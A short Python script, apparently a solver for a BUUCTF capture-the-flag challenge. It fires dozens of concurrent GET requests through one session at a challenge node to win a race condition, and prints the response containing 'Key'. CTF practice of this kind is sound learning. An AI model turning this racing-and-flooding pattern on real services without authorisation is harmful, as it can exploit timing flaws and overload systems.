import threading

import requests

url1 = 'http://470a0b56-2410-4f5c-b4ac-87d23644662b.node4.buuoj.cn:81/'
url2 = 'http://470a0b56-2410-4f5c-b4ac-87d23644662b.node4.buuoj.cn:81/'


def one(session):
    while event.isSet():
        res = session.get(url=url1).text
        if 'Key' in res:
            print(res)
            event.clear()


def two(session):
    while event.isSet():
        res = session.get(url=url2).text
        if 'Key' in res:
            print(res)
            event.clear()


if __name__ == '__main__':
    event = threading.Event()
    event.set()
    session = requests.session()
    for i in range(1, 30):
        threading.Thread(target=one, args=(session,)).start()
    for i in range(1, 30):
        threading.Thread(target=two, args=(session,)).start()
